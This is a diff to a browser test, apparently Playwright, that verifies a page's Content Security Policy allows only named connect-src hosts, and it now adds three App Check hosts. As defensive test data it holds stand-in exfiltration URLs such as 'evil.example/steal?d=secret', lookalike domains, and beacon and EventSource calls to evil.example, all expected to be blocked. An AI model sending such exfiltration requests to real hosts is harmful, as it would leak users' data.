@@ -4,26 +4,27 @@ const { ctx, pg } = await fresh();
 const ok = h => ({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: '{"Answer":[{"type":1,"data":"185.199.108.153"},{"type":1,"data":"185.199.109.153"},{"type":1,"data":"185.199.110.153"},{"type":1,"data":"185.199.111.153"}],"reply":"HOOK-REPLY"}' });
 const hits = [], served = []; pg.on('request', r => hits.push(r.url()));
 // every ALLOWED host answers; the evil ones also would, so only the browser rule can stop them
-await ctx.route(/firestore\.googleapis\.com|identitytoolkit\.googleapis\.com|securetoken\.googleapis\.com|portfolio-forms\.fredespinosa86-app\.workers\.dev|www\.googleapis\.com|script\.google\.com|script\.googleusercontent\.com|www\.youtube\.com\/oembed|dns\.google|evil\.example|hook\.evil\.test|example\.com/, r => { served.push(r.request().url()); r.fulfill(ok()); });
+await ctx.route(/firestore\.googleapis\.com|identitytoolkit\.googleapis\.com|securetoken\.googleapis\.com|portfolio-forms\.fredespinosa86-app\.workers\.dev|www\.googleapis\.com|script\.google\.com|script\.googleusercontent\.com|www\.youtube\.com\/oembed|dns\.google|www\.google\.com\/recaptcha|recaptchaenterprise\.googleapis\.com|content-firebaseappcheck\.googleapis\.com|evil\.example|hook\.evil\.test|example\.com/, r => { served.push(r.request().url()); r.fulfill(ok()); });
 await pg.evaluate(() => { window.__viol = []; document.addEventListener('securitypolicyviolation', e => window.__viol.push(e.effectiveDirective + ' ' + e.blockedURI)); });
 const tryFetch = u => pg.evaluate(async u => { try { const r = await fetch(u); return r.ok ? 'ok' : 'status ' + r.status; } catch (e) { return 'blocked'; } }, u);
 
 // ---- 1. the policy in the page is the tight one
 const pol = await pg.evaluate(() => window.coreCsp.parse(window.coreCsp.metaText()));
 const conn = pol['connect-src'];
-check('connect-src in the page is self + 9 named hosts, no https:', conn[0] === "'self'" && conn.length === 10 && !conn.includes('https:') && !conn.includes('*'), conn.join(' '));
+check('connect-src in the page is self + 12 named hosts (SE-E1 added the 3 App Check hosts), no https:', conn[0] === "'self'" && conn.length === 13 && !conn.includes('https:') && !conn.includes('*'), conn.join(' '));
 check('the other directives are unchanged by this phase (img-src and media-src are tightened and tested in s2c3-1)', pol['object-src'][0] === "'none'" && pol['default-src'][0] === "'self'" && pol['form-action'][0] === "'self'");
 
 // ---- 2. allowed hosts work, others are blocked by the browser itself
 const allowed = ['https://firestore.googleapis.com/v1/x', 'https://identitytoolkit.googleapis.com/v1/x', 'https://securetoken.googleapis.com/v1/x', 'https://portfolio-forms.fredespinosa86-app.workers.dev/status',
-  'https://www.googleapis.com/calendar/v3/freeBusy', 'https://script.google.com/macros/s/AAAA/exec', 'https://script.googleusercontent.com/macros/echo', 'https://www.youtube.com/oembed?format=json', 'https://dns.google/resolve?name=a'];
+  'https://www.googleapis.com/calendar/v3/freeBusy', 'https://script.google.com/macros/s/AAAA/exec', 'https://script.googleusercontent.com/macros/echo', 'https://www.youtube.com/oembed?format=json', 'https://dns.google/resolve?name=a',
+  'https://www.google.com/recaptcha/enterprise/clr', 'https://recaptchaenterprise.googleapis.com/v1/x', 'https://content-firebaseappcheck.googleapis.com/v1/x'];   // SE-E1 App Check hosts
 for (const u of allowed) check('allowed: ' + new URL(u).host, await tryFetch(u) === 'ok', await tryFetch(u));
 check('allowed: same-origin request', await pg.evaluate(async () => { try { return (await fetch(location.pathname, { method: 'HEAD' })).ok; } catch (e) { return false; } }));
-const evil = ['https://evil.example/steal?d=secret', 'https://firestore.googleapis.com.evil.example/x', 'https://evilfirestore.googleapis.com/x', 'https://accounts.google.com/x', 'https://www.google.com/x', 'https://workers.dev/x',
+const evil = ['https://evil.example/steal?d=secret', 'https://firestore.googleapis.com.evil.example/x', 'https://evilfirestore.googleapis.com/x', 'https://accounts.google.com/x', 'https://www.google.com.evil.example/x', 'https://workers.dev/x',
   'https://other.workers.dev/x', 'https://example.com/index.html', 'http://dns.google/resolve', 'https://dns.google:8443/resolve'];
 for (const u of evil) check('blocked: ' + u.replace(/\?.*/, ''), await tryFetch(u) === 'blocked');
 check('the browser reported every block, with the directive', await pg.evaluate(n => window.__viol.length >= n && window.__viol.every(v => v.startsWith('connect-src')), evil.length), JSON.stringify(await pg.evaluate(() => window.__viol)));
-check('no request to a blocked host was ever served (the browser stopped each one first)', !served.some(u => /evil\.example|evilfirestore|other\.workers\.dev|example\.com\/index|accounts\.google|www\.google\.com|http:\/\/dns|:8443/.test(u)), served.filter(u => /evil|example|8443|accounts|www\.google\.com\//.test(u)).join(' '));
+check('no request to a blocked host was ever served (the browser stopped each one first)', !served.some(u => /evil\.example|evilfirestore|other\.workers\.dev|example\.com\/index|accounts\.google|www\.google\.com(?!\/recaptcha\/enterprise\/clr$)|http:\/\/dns|:8443/.test(u)), served.filter(u => /evil|example|8443|accounts|www\.google\.com\//.test(u)).join(' '));
 served.length = 0; await pg.evaluate(() => { window.__viol.length = 0; });
 await pg.evaluate(async () => { navigator.sendBeacon('https://evil.example/b', 'x'); try { const e = new EventSource('https://evil.example/s'); await new Promise(r => { e.onerror = r; setTimeout(r, 600); }); e.close(); } catch (x) { /* blocked */ } await new Promise(r => setTimeout(r, 300)); });
 check('other kinds of connections are blocked too: beacon and EventSource', !served.some(u => /evil\.example\/(b|s)/.test(u)) && (await pg.evaluate(() => window.__viol.filter(v => /connect-src https:\/\/evil\.example/.test(v)).length)) >= 2, JSON.stringify(await pg.evaluate(() => window.__viol)) + hits.join(' '));
